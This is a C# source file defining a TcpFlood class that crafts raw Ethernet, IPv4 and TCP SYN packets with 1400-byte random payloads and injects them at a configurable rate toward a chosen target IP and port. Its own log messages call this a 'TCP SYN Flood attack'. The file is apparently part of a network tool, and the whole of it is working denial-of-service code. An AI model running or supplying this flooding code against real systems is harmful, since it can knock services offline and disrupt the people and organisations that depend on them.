using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Buffers;
using System.Runtime.InteropServices;
using System.Net.Sockets;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly byte[] _gatewayMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        private static readonly ArrayPool<byte> PacketPool = ArrayPool<byte>.Shared;

        public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] gatewayMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _gatewayMac = gatewayMac;
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var ethernetPacket = new EthernetPacket(
                    _sourceMac,
                    new PhysicalAddress(_targetMac),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(
                    IPAddress.Parse(_sourceIp),
                    IPAddress.Parse(_targetIp))
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = 128
                };

                var tcpPacket = new TcpPacket(
                    6819,
                    (ushort)_targetPort)
                {
                    Flags = 0x02,
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[1400]
                };

                new Random().NextBytes(tcpPacket.PayloadData);
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
                int batchSize = 1000;
                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;

                Logger.Info($"TCP SYN Flood: Target rate {_bytesPerSecond / 125_000} Mbps ({packetsPerSecond} packets/sec, {batchSize} batch size)");

                await Task.Run(() =>
                {
                    var stopwatch = new System.Diagnostics.Stopwatch();
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();
                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                (_device as IInjectionDevice).SendPacket(ethernetPacket);
                            }

                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
                            if (elapsedMicroseconds < delayMicroseconds)
                            {
                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000)
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed to send TCP packet.");
                        }
                    }
                    return Task.CompletedTask;
                }, _cancellationToken);
            }
            catch (TaskCanceledException)
            {
                Logger.Info("TCP SYN Flood attack was canceled.");
            }
            finally
            {
                _device?.Close();
                Logger.Info("TCP SYN Flood attack stopped.");
            }
        }

        public void Dispose()
        {
            _device?.Dispose();
        }
    }
}
